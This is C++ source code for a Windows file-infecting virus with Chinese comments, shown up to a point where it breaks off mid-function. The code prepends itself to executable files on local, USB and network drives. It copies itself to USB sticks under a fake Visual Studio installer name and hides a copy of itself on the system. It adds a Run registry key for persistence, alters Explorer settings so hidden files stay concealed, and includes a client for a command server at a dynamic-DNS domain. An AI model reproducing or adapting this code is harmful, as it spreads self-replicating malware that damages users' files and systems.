#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <winsock2.h>
#include <direct.h>
#include <process.h>
#include <Tlhelp32.h>
#include <shellapi.h>
#include <time.h>


#define Name_Length 300
#define Path_Length 2000
#define Suffix_Len 20
#define Target_File_Type {"doc","docx","txt","xls","wps",NULL}
#define Directory_Path "D:\\123"    //保存文件的路径
#define Target_File_Path "D:\\NTDEITECTKCB.exe"
#define Backup_Name "TECTKCBNTDEI.exe"
#define Spread_Name "VS2012_ULT_chs.exe"
#define Myself_Length 86016
#define EXE_File_Max_Length 104857600
#define KEY "588b5b964438cad01862619d118d113e"
#define ASCII_DEV 7
#define Server_Domain "3322.org" 
#define Server_Port_1 7821
#define Server_Port_2 9912

using namespace std;

static char *Myself_Path;              //指向本程序路径
int Thread_Switch=0;

#pragma comment(lib, "winmm.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(lib,"ws2_32.lib")



/////////////////////////////////////枚举进程/////////////////////////////////////////////

class Enum_Process
{
public:
    int Seek_Process(char *ProcessName,HANDLE *Handle_List);     //检查进程名，成功返回该进程句柄，失败返回NULL。
private:
    int Privilege();
};

int Enum_Process::Seek_Process(char *ProcessName,HANDLE *Handle_List)
{
    //返回该同名进程数
    if(!Privilege()) return 0;

    HANDLE hProcess=NULL;
    int i=0;

    PROCESSENTRY32 Pe32;
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);

    memset(&Pe32,NULL,sizeof(Pe32));

    Pe32.dwSize=sizeof(Pe32);
    if(Process32First(hSnap,&Pe32)!=TRUE) return 0;
    do
    {
        if(!strcmp(Pe32.szExeFile,ProcessName))
        {
            if((hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,Pe32.th32ProcessID))!=INVALID_HANDLE_VALUE)   //返回进程句柄
            {
                Handle_List[i]=hProcess;
                i++;
                CloseHandle(hProcess);
            }
        }
    }
    while(Process32Next(hSnap,&Pe32)==TRUE);

    return i;
}

int Enum_Process::Privilege()
{
    //提升当前进程的访问令牌
    HANDLE hToken=NULL;

    if(OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken)!=TRUE) return 0;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount=1;
    LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);

    CloseHandle(hToken);
    return 1;
}

/*---------------------------------------  枚举进程------------------------------------------------*/


////////////////////////////////////////////磁盘相关////////////////////////////////////////////////

class Drives_Operate
{
public:
    char *Check_Removable_Drive(char *Removable_Drive,int Length);
    char *Check_Fixed_Drive(char *Fixed_Drive,int Length);
    char *Check_Remote_Drive(char *Remote_Drive,int Length);
};

char *Drives_Operate::Check_Removable_Drive(char *Removable_Drive,int Length)
{
    char *p=NULL,ALL_Drives[100],CurrDrive[10];
    int k,flag=0;
    unsigned long int i;

    memset(Removable_Drive,NULL,Length);
    memset(ALL_Drives,NULL,sizeof(ALL_Drives));
    memset(CurrDrive,NULL,sizeof(CurrDrive));

    GetLogicalDriveStrings(sizeof(ALL_Drives),ALL_Drives);    //获取本机所有磁盘列表
    for(k=0,p=CurrDrive,i=0; k<2; i++)
    {
        if(ALL_Drives[i]!=NULL)
        {
            k=0;
            *p=ALL_Drives[i];
            p++;
        }
        else
        {
            k++;
            p=CurrDrive;
            //printf("%s\n",CurrDrive);
            if(GetDriveType(CurrDrive)==DRIVE_REMOVABLE)
            {
                flag=1;
                //printf("检测到移动磁盘:%s\n",CurrDrive);
                strcat(Removable_Drive,CurrDrive);
                strcat(Removable_Drive,",");
            }
            memset(CurrDrive,NULL,sizeof(CurrDrive));
        }
    }
    if(flag)
    {
        Removable_Drive[strlen(Removable_Drive)-1]=NULL;
        return Removable_Drive;        //返回储存有移动磁盘盘符的字符串指针
    }
    else
        return NULL;   //没有检测到移动磁盘
}

char *Drives_Operate::Check_Fixed_Drive(char *Fixed_Drive,int Length)
{
    char *p=NULL,ALL_Drives[100],CurrDrive[10];
    int k,flag=0;
    unsigned long int i;

    memset(Fixed_Drive,NULL,Length);
    memset(ALL_Drives,NULL,sizeof(ALL_Drives));
    memset(CurrDrive,NULL,sizeof(CurrDrive));

    GetLogicalDriveStrings(sizeof(ALL_Drives),ALL_Drives);    //获取本机所有磁盘列表
    for(k=0,p=CurrDrive,i=0; k<2; i++)
    {
        if(ALL_Drives[i]!=NULL)
        {
            k=0;
            *p=ALL_Drives[i];
            p++;
        }
        else
        {
            k++;
            p=CurrDrive;
            //printf("%s\n",CurrDrive);
            if(GetDriveType(CurrDrive)==DRIVE_FIXED)
            {
                flag=1;
                //printf("检测到固定磁盘:%s\n",CurrDrive);
                strcat(Fixed_Drive,CurrDrive);
                strcat(Fixed_Drive,",");
            }
            memset(CurrDrive,NULL,sizeof(CurrDrive));
        }
    }
    if(flag)
    {
        Fixed_Drive[strlen(Fixed_Drive)-1]=NULL;
        return Fixed_Drive;        //返回储存有移动磁盘盘符的字符串指针
    }
    else
        return NULL;   //没有检测到固定磁盘
}

char *Drives_Operate::Check_Remote_Drive(char *Remote_Drive,int Length)
{
    char *p=NULL,ALL_Drives[100],CurrDrive[10];
    int k,flag=0;
    unsigned long int i;

    memset(Remote_Drive,NULL,Length);
    memset(ALL_Drives,NULL,sizeof(ALL_Drives));
    memset(CurrDrive,NULL,sizeof(CurrDrive));

    GetLogicalDriveStrings(sizeof(ALL_Drives),ALL_Drives);    //获取本机所有磁盘列表
    for(k=0,p=CurrDrive,i=0; k<2; i++)
    {
        if(ALL_Drives[i]!=NULL)
        {
            k=0;
            *p=ALL_Drives[i];
            p++;
        }
        else
        {
            k++;
            p=CurrDrive;
            //printf("%s\n",CurrDrive);
            if(GetDriveType(CurrDrive)==DRIVE_REMOTE)
            {
                flag=1;
                //printf("检测到网络磁盘:%s\n",CurrDrive);
                strcat(Remote_Drive,CurrDrive);
                strcat(Remote_Drive,",");
            }
            memset(CurrDrive,NULL,sizeof(CurrDrive));
        }
    }
    if(flag)
    {
        Remote_Drive[strlen(Remote_Drive)-1]=NULL;
        return Remote_Drive;        //返回储存有网络磁盘盘符的字符串指针
    }
    else
        return NULL;   //没有检测到固定磁盘
}


/*-------------------------------------------磁盘相关-----------------------------------------------*/




////////////////////////////////////////////文件操作//////////////////////////////////////////////

class File_Operate
{
public:
    BOOL Bind_EXE_File(char *File_Path);              //将自身程序和目标文件捆绑
    BOOL Release_EXE_File(char *File_Path);           //释放被捆绑的程序
    BOOL Release_Virus_File(char *File_Path);         //将自身病毒释放
    int BeginProcess(char *Path_t,char *Parameter);
};

BOOL File_Operate::Bind_EXE_File(char *File_Path)
{
    //printf("File_Path:%s\n",File_Path);

    FILE *Myself=NULL,*Target_File=NULL,*Tmp_File=NULL;
    char TEMP_Path[300];
    char Buff[1024],*p=NULL,File_Name[260],*Start_Name=NULL;
    int bytes=0;
    unsigned long int Now_Time=0;


    memset(TEMP_Path,NULL,sizeof(TEMP_Path));
    memset(Buff,NULL,sizeof(Buff));
	memset(File_Name,NULL,sizeof(File_Name));

	for(p=File_Path;*p!=NULL;p++)
		if(*p=='\\') Start_Name=p+1;
	memcpy(File_Name,Start_Name,p-Start_Name);
    Now_Time=time(NULL);
    sprintf(TEMP_Path,"%s\\%s%d",getenv("TEMP"),File_Name,Now_Time);

    //printf("TEMP_Path:%s\n",TEMP_Path);

    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }
    if((Target_File=fopen(File_Path,"rb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }
    if((Tmp_File=fopen(TEMP_Path,"wb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }

    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
    {
        fwrite(Buff,sizeof(char),bytes,Tmp_File);
        memset(Buff,NULL,sizeof(Buff));
    }
    fflush(Tmp_File);
    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Target_File))>0)
    {
        fwrite(Buff,sizeof(char),bytes,Tmp_File);
        memset(Buff,NULL,sizeof(Buff));
    }
    fflush(Tmp_File);
    fcloseall();
    remove(File_Path);
    if(!rename(TEMP_Path,File_Path)) return FALSE;
    remove(TEMP_Path);

    return TRUE;
}

BOOL File_Operate::Release_Virus_File(char *File_Path)
{
    FILE *Myself=NULL,*Target_Virus_File=NULL;
    char Buff[1024],Parameter[600];
    char TEMP_Path_File[300];
    unsigned long int Now_Time=0;
    int bytes=0,total_bytes=0;

    memset(Buff,NULL,sizeof(Buff));
    memset(Parameter,NULL,sizeof(Parameter));
    memset(TEMP_Path_File,NULL,sizeof(TEMP_Path_File));

    Now_Time=time(NULL);       //用当前时间作为临时文件名
    sprintf(TEMP_Path_File,"%s\\%d.exe",getenv("TEMP"),Now_Time);   //获取临时病毒文件路径
    //printf("Release_Virus_File:%s\n",TEMP_Path_File);
    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }
    if((Target_Virus_File=fopen(TEMP_Path_File,"wb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }
    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
    {
        total_bytes+=bytes;
        fwrite(Buff,sizeof(char),bytes,Target_Virus_File);
        memset(Buff,NULL,sizeof(Buff));
        if(total_bytes==Myself_Length) break;
    }
    fcloseall();
    sprintf(Parameter,"%s %s",KEY,Myself_Path); //向临时病毒中传入的参数:[程序指纹] [被感染的文件路径]
    BeginProcess(TEMP_Path_File,Parameter);
    return TRUE;
}

BOOL File_Operate::Release_EXE_File(char *File_Path)
{
    FILE *Target_EXE_File=NULL,*Release_EXE=NULL;
    char Buff[1024],TEMP_Path[300],*p=NULL,*Start_Name=NULL,Target_File_Name[300];
    int bytes=0;

    memset(Buff,NULL,sizeof(Buff));
    memset(TEMP_Path,NULL,sizeof(TEMP_Path));
    memset(Target_File_Name,NULL,sizeof(Target_File_Name));

    for(p=File_Path; *p!=NULL; p++)
        if(*p=='\\') Start_Name=p+1;
    memcpy(Target_File_Name,Start_Name,p-Start_Name);     //获取目标文件名
    if((Target_EXE_File=fopen(File_Path,"rb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }
    sprintf(TEMP_Path,"%s\\%s",getenv("TEMP"),Target_File_Name);
    //printf("Release_EXE_File:%s\n",TEMP_Path);
    if((Release_EXE=fopen(TEMP_Path,"wb"))==NULL)
    {
        fcloseall();
        return ERROR;
    }
    fseek(Target_EXE_File,Myself_Length,SEEK_SET);
    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Target_EXE_File))>0)
    {
        fwrite(Buff,sizeof(char),bytes,Release_EXE);
        memset(Buff,NULL,sizeof(Buff));
    }
    fflush(Release_EXE);
    fcloseall();
    BeginProcess(TEMP_Path,NULL);
    return TRUE;
}

int File_Operate::BeginProcess(char *Path_t,char *Parameter)
{
    //启动程序,返回1表示启动成功,0表示启动失败。
    char *Path=Path_t;

    HANDLE hProcess=ShellExecute(NULL,"open",Path,Parameter,NULL,SW_HIDE);
    if(hProcess==NULL)
    {
        CloseHandle(hProcess);
        return 0;
    }
    CloseHandle(hProcess);
    return 1;
}

/*-------------------------------------------文件操作-----------------------------------------------*/



///////////////////////////////////////////网络通讯////////////////////////////////////////////////////

class Net_Communication
{
public:
	char *DNSQuery(char *Domain);
	SOCKET Create_Connect(char *IPADDRESS,int PORT);             //连接至服务器,返回套接字描述字
	int Recv_Data(SOCKET soc,char *Buff,int Buff_Length);        //接收数据
	int Send_Data(SOCKET soc,char *Buff,int Buff_Length);        //发送数据
private:
	int Encrypt_String(char *str_t,int str_length);           //加密字符串
	int Decipher_String(char *str_t,int str_length);          //解密字符串
};

char *Net_Communication::DNSQuery(char *Domain)
{
	struct hostent *Target_host;
	struct in_addr addr;

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);
	if((Target_host=gethostbyname(Domain))==NULL)
	{
		WSACleanup();
		return NULL;
	}
	WSACleanup();
	memcpy(&addr.S_un.S_addr,*Target_host->h_addr_list,Target_host->h_length);
	return inet_ntoa(addr);
}

SOCKET Net_Communication::Create_Connect(char *IPADDRESS,int PORT)
{
	SOCKET ServerSocket;
	struct sockaddr_in ServerAddress;
	WSADATA wsa;

	memset(&ServerAddress,NULL,sizeof(struct sockaddr_in));

	if(WSAStartup(MAKEWORD(2,2),&wsa)!=0) return SOCKET_ERROR;
	if((ServerSocket=socket(AF_INET,SOCK_STREAM,0))==SOCKET_ERROR)
	{
		WSACleanup();
		return SOCKET_ERROR;
	}
	ServerAddress.sin_addr.s_addr=inet_addr(IPADDRESS);
	ServerAddress.sin_family=AF_INET;
	ServerAddress.sin_port=htons(PORT);

	if(connect(ServerSocket,(struct sockaddr *)&ServerAddress,sizeof(ServerAddress))==SOCKET_ERROR)
	{
		WSACleanup();
		return SOCKET_ERROR;
	}
	return ServerSocket;
}

int Net_Communication::Recv_Data(SOCKET soc,char *Buff,int Buff_Length)
{
	int bytes=0;
	memset(Buff,NULL,sizeof(Buff));
	if((bytes=recv(soc,Buff,Buff_Length,0))==SOCKET_ERROR) return SOCKET_ERROR;
	Decipher_String(Buff,strlen(Buff));
	return bytes;
}

int Net_Communication::Send_Data(SOCKET soc,char *Buff,int Buff_Length)
{
	int bytes=0;
	Encrypt_String(Buff,Buff_Length);
	if((bytes=send(soc,Buff,Buff_Length,0))==SOCKET_ERROR) return SOCKET_ERROR;
	return bytes;
}

int Net_Communication::Encrypt_String(char *str_t,int str_length)
{
	char *p=NULL;
	int i;

	for(i=0;i<str_length;i++)
	{
		*p=str_t[i];
		str_t[i]=*p*ASCII_DEV;
	}
	return 0;
}

int Net_Communication::Decipher_String(char *str_t,int str_length)
{
	char *p=NULL;
	int i;

	for(i=0;i<str_length;i++)
	{
		*p=str_t[i];
		str_t[i]=*p/ASCII_DEV;
	}
	return 0;
} 


/*-----------------------------------------网络通讯-------------------------------------------------*/

///////////////////////////////////////引导模块/////////////////////////////////////////////////

int Check_Myself()
{
    //返回1表示此文件被捆绑,0表示文件未被捆绑
    FILE *Myself=NULL;

    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return 1;
    }
    fseek(Myself,0,SEEK_END);
    if(ftell(Myself)>Myself_Length)
    {
        fcloseall();
        return 1;
    }
    else
    {
        fcloseall();
        return 0;
    }

}

int Check_Myself_Name()
{
    //返回1表示本程序是主程序，0表示不是主程序

    if(!strcmp(Target_File_Path,Myself_Path)) return 1;

    return 0;
}

int Check_Target(char *File_Path)
{
    //检查目标是否已被感染,返回1表示已感染，0表示未感染。
    int bytes=0;
    unsigned long File_Size=0;
    char Buff_T[1024],Buff_M[1024];
    FILE *Target_File=NULL,*Myself=NULL;

    memset(Buff_T,NULL,sizeof(Buff_T));
    memset(Buff_M,NULL,sizeof(Buff_M));

    if((Target_File=fopen(File_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }
    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }
	fseek(Target_File,0,SEEK_END);
	if(ftell(Target_File)<Myself_Length) return 0;
	rewind(Target_File);

    while(fread(Buff_M,sizeof(Buff_M)-1,1,Myself)>0 && fread(Buff_T,sizeof(Buff_T)-1,1,Target_File)>0)
    {
        if(strcmp(Buff_M,Buff_T)!=0)
        {
            fcloseall();
            return 0;
        }
    }
    fcloseall();
    return 1;
}

int Check_Process(char *Process_Name)
{
    //检查进程是否已经存在
    class Enum_Process Seek_Pro;
    int Process_Num=0,Max_Num=0;
    HANDLE Process_List[50];
    char My_Name[20],*p=NULL,*Name_Start=NULL;

    memset(My_Name,NULL,sizeof(My_Name));

    for(p=Myself_Path; *p!=NULL; p++)
    {
        if(*p=='\\') Name_Start=p+1;
    }

    memcpy(My_Name,Name_Start,p-Name_Start);     //获取本程序名

    if(!strcmp(My_Name,Process_Name)) Max_Num=2;   //若与被检查的进程名相同则需要返回两个相同的进程名则表示程序先前已启动
    else
        Max_Num=1;   //若不相同则只需检查有无一个此进程名
    if((Process_Num=Seek_Pro.Seek_Process(Process_Name,Process_List))==0)        //检查此进程名是否存在，若已存在则返回其进程句柄
        return 0;                   //表示不存在此进程
    else
    {
        if(Process_Num>=Max_Num) return 1;                    //表示存在此进程
        else
            return 0;
    }
}
/*------------------------------------------------------------------------------------------------*/




/////////////////////////////////////////感染模块////////////////////////////////////////////////

int Inject_Target_Computer()
{
    //返回1表示感染成功，0表示感染失败。
    FILE *Target_File=NULL,*Myself=NULL;
    int bytes=0;
    char Buff[1024];

    memset(Buff,NULL,sizeof(Buff));
    if((Target_File=fopen(Target_File_Path,"wb"))==NULL)
    {
        fcloseall();
        return 0;
    }
    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }

    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
    {
        fwrite(Buff,sizeof(char),bytes,Target_File);
        memset(Buff,NULL,sizeof(Buff));
    }
    fcloseall();
    SetFileAttributes(Target_File_Path,FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    return 1;
}

int Inject_Target_Removable_Drive(char *Target_Path)
{
    //返回0表示感染失败,1表示感染成功。
    FILE *Target_File=NULL,*Myself=NULL;
    char Buff[1024];
    int bytes=0;

    memset(Buff,NULL,sizeof(Buff));

    if((Target_File=fopen(Target_Path,"wb"))==NULL)
    {
        fcloseall();
        return 0;
    }
    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }
    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
    {
        fwrite(Buff,bytes,sizeof(char),Target_File);
        memset(Buff,NULL,sizeof(Buff));
    }
    fcloseall();
    return 1;
}

int Inject_EXE_File(char *Target_Path,int EXE_File_Length,int Directory_Deep)
{
    //printf("Target_Path:%s\n",Target_Path);

    if(Directory_Deep==0) return 0;

    char folder[Name_Length],file[Name_Length],path[Path_Length],Paramter_path[Path_Length],Traversal_Dir_Path[Path_Length];
    char *file_type="\\*.exe",EXE_File_Path[Path_Length];
    int Directory_Deep_Num=Directory_Deep;             //遍历目录的级数
    WIN32_FIND_DATA FindFileData;
    class File_Operate func;
    FILE *Target_File=NULL;

    memset(folder,NULL,sizeof(folder));
    memset(file,NULL,sizeof(file));
    memset(path,NULL,sizeof(path));
    memset(Traversal_Dir_Path,NULL,sizeof(Traversal_Dir_Path));
    memset(Paramter_path,NULL,sizeof(Paramter_path));
    memset(EXE_File_Path,NULL,sizeof(EXE_File_Path));

    strcat(path,Target_Path);
    if(path[strlen(path)-1]=='\\') path[strlen(path)-1]=NULL;   //消去路径最后一位的'\'
    strcat(Paramter_path,path);        //子目录路径
    strcat(Traversal_Dir_Path,path);    //遍历所有文件
    strcat(EXE_File_Path,path);
    strcat(EXE_File_Path,file_type);
    //表示不遍历此目录
    if(!strcmp(Traversal_Dir_Path,".") || !strcmp(Traversal_Dir_Path,"..") || Traversal_Dir_Path[strlen(Traversal_Dir_Path)-1]=='.') return 0;

    strcat(Traversal_Dir_Path,"\\*.*");

    //遍历出当前目录下所有的文件夹和文件
    HANDLE hFind=FindFirstFile(Traversal_Dir_Path,&FindFileData);  //读取目录下第一个文件
    if(hFind==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;   //表示当前目录下为空
    }
    do
    {
        if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件夹
            memset(folder,NULL,sizeof(folder));
            strcat(folder,FindFileData.cFileName);
            //printf("folder:%s\n",folder);
            if(folder[strlen(folder)-1]=='.') continue;
            Paramter_path[strlen(Paramter_path)]='\\';
            strcat(Paramter_path,folder);
            //printf("遍历子目录:%s\n",Paramter_path);
            Inject_EXE_File(Paramter_path,EXE_File_Length,Directory_Deep_Num-1);    //递归

            memset(Paramter_path,NULL,sizeof(Paramter_path));
            strcat(Paramter_path,path);
        }
    }
    while(FindNextFile(hFind,&FindFileData));

    FindClose(hFind);

    //查找当前目录下的指定文件

    if((hFind=FindFirstFile(EXE_File_Path,&FindFileData))==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;
    }
    do
    {
        if(FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件
            strcat(file,FindFileData.cFileName);
            //printf("file:%s\npath:%s\n",file,path);
            memset(EXE_File_Path,NULL,sizeof(EXE_File_Path));
            strcat(EXE_File_Path,path);
            strcat(EXE_File_Path,"\\");
            strcat(EXE_File_Path,file);
            //printf("EXE_Path:%s\n",EXE_File_Path);
            if((Target_File=fopen(EXE_File_Path,"rb"))!=NULL)
            {
                fseek(Target_File,0,SEEK_END);
                if(ftell(Target_File)<=EXE_File_Length)
                    if(!Check_Target(EXE_File_Path))
                        func.Bind_EXE_File(EXE_File_Path);
                Sleep(10);                 //每感染一个EXE文件就暂停10毫秒，防止CPU使用过高
            }

            fcloseall();
            memset(file,NULL,sizeof(file));
        }
    }
    while(FindNextFile(hFind,&FindFileData));

    FindClose(hFind);
    return 1;
}

DWORD WINAPI Inject_Drives(LPVOID Parameter)
{
    class Drives_Operate Drives_Operate_func;
    unsigned int i;
    int Removable_Drive_String_Len=0;
    char Removable_Drive[100],Fixed_Drive[100],Remote_Drive[100],Target_Drive[10],Windows_Path[260],Target_File[50],*p=NULL;

    memset(Removable_Drive,NULL,sizeof(Removable_Drive,sizeof(Removable_Drive)));
    memset(Target_Drive,NULL,sizeof(Target_Drive));
    memset(Target_File,NULL,sizeof(Target_File));
    memset(Fixed_Drive,NULL,sizeof(Fixed_Drive));
    memset(Remote_Drive,NULL,sizeof(Remote_Drive));
    memset(Windows_Path,NULL,sizeof(Windows_Path));

    while(1)
    {
        Sleep(10000);              //每读取一次磁盘后程序暂停十秒防止CPU使用率过高
		if(!Thread_Switch) return 0;
        if(Drives_Operate_func.Check_Removable_Drive(Removable_Drive,sizeof(Removable_Drive))!=NULL)
        {
            //printf("检测到移动磁盘:%s\n",Removable_Drive);

            for(i=0,p=Target_Drive; 1; i++)
            {
                //遍历所有的可移动磁盘
                if(Removable_Drive[i]!=',' && Removable_Drive[i]!=NULL)
                {
                    *p=Removable_Drive[i];
                    p++;
                }
                else
                {
                    p=Target_Drive;
                    //检测设备是否就绪
                    if(!GetVolumeInformation(Target_Drive,0,0,0,0,0,0,0));  //设备未就绪
                    else
                    {
						if(!Thread_Switch) return 0;
                        sprintf(Target_File,"%s%s",Target_Drive,Spread_Name);            //设备已就绪
                        Inject_Target_Removable_Drive(Target_File);
                        Inject_EXE_File(Target_Drive,EXE_File_Max_Length,-1);
                        memset(Target_File,NULL,sizeof(Target_File));
                    }
                    memset(Target_Drive,NULL,sizeof(Target_Drive));
                }
                if(Removable_Drive[i]==NULL) break;
            }
        }
        if(Drives_Operate_func.Check_Fixed_Drive(Fixed_Drive,sizeof(Fixed_Drive))!=NULL)
        {

            for(i=0,p=Target_Drive; 1; i++)
            {
                //遍历所有的固定磁盘
                if(Fixed_Drive[i]!=',' && Fixed_Drive[i]!=NULL)
                {
                    *p=Fixed_Drive[i];
                    p++;
                }
                else
                {
                    p=Target_Drive;
                    //检测设备是否就绪
                    if(!GetVolumeInformation(Target_Drive,0,0,0,0,0,0,0)) goto skip;  //设备未就绪
                    GetWindowsDirectory(Windows_Path,sizeof(Windows_Path));
                    if(Windows_Path[0]==Target_Drive[0]) goto skip;
                    else
                    {
						if(!Thread_Switch) return 0;
                        Inject_EXE_File(Target_Drive,EXE_File_Max_Length,2);
                    }
skip:
                    memset(Windows_Path,NULL,sizeof(Windows_Path));
                    memset(Target_Drive,NULL,sizeof(Target_Drive));
                }
                if(Fixed_Drive[i]==NULL) break;
            }
        }
        if(Drives_Operate_func.Check_Remote_Drive(Remote_Drive,sizeof(Remote_Drive))!=NULL)
        {

            for(i=0,p=Target_Drive; 1; i++)
            {
                //遍历所有的网络磁盘
                if(Remote_Drive[i]!=',' && Remote_Drive[i]!=NULL)
                {
                    *p=Remote_Drive[i];
                    p++;
                }
                else
                {
                    p=Target_Drive;
                    //检测设备是否就绪
                    if(!GetVolumeInformation(Target_Drive,0,0,0,0,0,0,0));  //设备未就绪
                    else
                    {
						if(!Thread_Switch) return 0;
                        Inject_EXE_File(Target_Drive,EXE_File_Max_Length,-1);
                    }
                    memset(Target_Drive,NULL,sizeof(Target_Drive));
                }
                if(Remote_Drive[i]==NULL) break;
            }
        }
    }
    return 0;
}

DWORD WINAPI Set_Regedit(LPVOID Parameter)
{
    FILE *bat=NULL;
    char bat_File[300],Key_Data[300];
	DWORD Key_Type=0,Key_Data_Length=0;
	HKEY hKey=NULL;
	char *Set_Reg_Cmd[]=
	{
		"@reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v KernelBootCheck /t REG_SZ /d %s /f",   //设置开机启动项
	    "@reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden /v CheckedValue /t REG_DWORD /d 1 /f",    //设置隐藏系统文件
		"@reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN /v CheckedValue /t REG_DWORD /d 1 /f",   //设置不显示隐藏文件
		"@reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f "   //设置无法更改显示隐藏文件
	};
	char Echo_Cmd[300]; 
	unsigned long int Now_Time=0;
	class File_Operate File_Oper_Func;

	memset(bat_File,NULL,sizeof(bat_File));
	while(1)

	{
		Sleep(3000);                   //循环检测周期为三秒
		if(!Thread_Switch) return 0;
		remove(bat_File);
      
		memset(bat_File,NULL,sizeof(bat_File));
		memset(Key_Data,NULL,sizeof(Key_Data));
		memset(Echo_Cmd,NULL,sizeof(Echo_Cmd));

		////////////////////////////////////检查开机启动项///////////////////////////////////////////////
	   	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey)!=ERROR_SUCCESS)
		{
		  	RegCloseKey(hKey);        //关闭注册表句柄
		   	continue;
		}
	    Key_Data_Length=sizeof(Key_Data);
    	if(RegQueryValueEx(hKey,"KernelBootCheck",NULL,&Key_Type,(BYTE *)Key_Data,&Key_Data_Length)!=ERROR_SUCCESS)
		{
		   	//printf("不存在此键\n");
			Now_Time=time(NULL);
			sprintf(bat_File,"%s\\boot%d.bat",getenv("TEMP"),Now_Time);
			if((bat=fopen(bat_File,"wt"))==NULL)
			{
				fcloseall();
				continue;
			}
			sprintf(Echo_Cmd,Set_Reg_Cmd[0],Target_File_Path);    //格式化命令
			fputs(Echo_Cmd,bat);                //输出命令
			fflush(bat);
			fcloseall();
			RegCloseKey(hKey);
		    File_Oper_Func.BeginProcess(bat_File,NULL);
			Sleep(200);
		}
		else
		{
			//存在此键
			sprintf(Echo_Cmd,Set_Reg_Cmd[0],Target_File_Path);    //格式化命令
			if(strcmp(Target_File_Path,Key_Data)!=0)      //检查键值是否正常
			{
				//键值不正常则重写键值
				//MessageBox(NULL,"键值需要重写","Message",MB_OK);
				Now_Time=time(NULL);
				sprintf(bat_File,"%s\\boot%d.bat",getenv("TEMP"),Now_Time);
				if((bat=fopen(bat_File,"wt"))==NULL)
				{
					fcloseall();
					continue;
				}
				fputs(Echo_Cmd,bat);
				fflush(bat);
				fcloseall();
	        	File_Oper_Func.BeginProcess(bat_File,NULL);
				Sleep(200);
			}
			RegCloseKey(hKey);
		}
		///////////////////////////////////////检查设置隐藏系统文件的注册表键值/////////////////////////////////////////////
		remove(bat_File);
		memset(bat_File,NULL,sizeof(bat_File));
		memset(Key_Data,NULL,sizeof(Key_Data));
		memset(Echo_Cmd,NULL,sizeof(Echo_Cmd));
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden",0,KEY_ALL_ACCESS,&hKey)!=ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			continue;
		}
		Key_Data_Length=sizeof(Key_Data);
		if(RegQueryValueEx(hKey,"CheckedValue",NULL,&Key_Type,(BYTE *)Key_Data,&Key_Data_Length)==ERROR_SUCCESS)
		{
			if(Key_Data[0]!=0x00000001)
			{
				//设置隐藏系统文件
				Now_Time=time(NULL);
				sprintf(bat_File,"%s\\HiddenSystem%d.bat",getenv("TEMP"),Now_Time);
				if((bat=fopen(bat_File,"wt"))==NULL)
				{
					fcloseall();
					continue;
				}
				fputs(Set_Reg_Cmd[1],bat);
				fflush(bat);
				fcloseall();
	        	File_Oper_Func.BeginProcess(bat_File,NULL);
				Sleep(200);
			}
		}
		else
		{
			RegCloseKey(hKey);
			continue;
		}
		RegCloseKey(hKey);
		////////////////////////////////////设置不显示隐藏文件选项////////////////////////////////////////////////////////
		remove(bat_File);
		memset(bat_File,NULL,sizeof(bat_File));
		memset(Key_Data,NULL,sizeof(Key_Data));
		memset(Echo_Cmd,NULL,sizeof(Echo_Cmd));
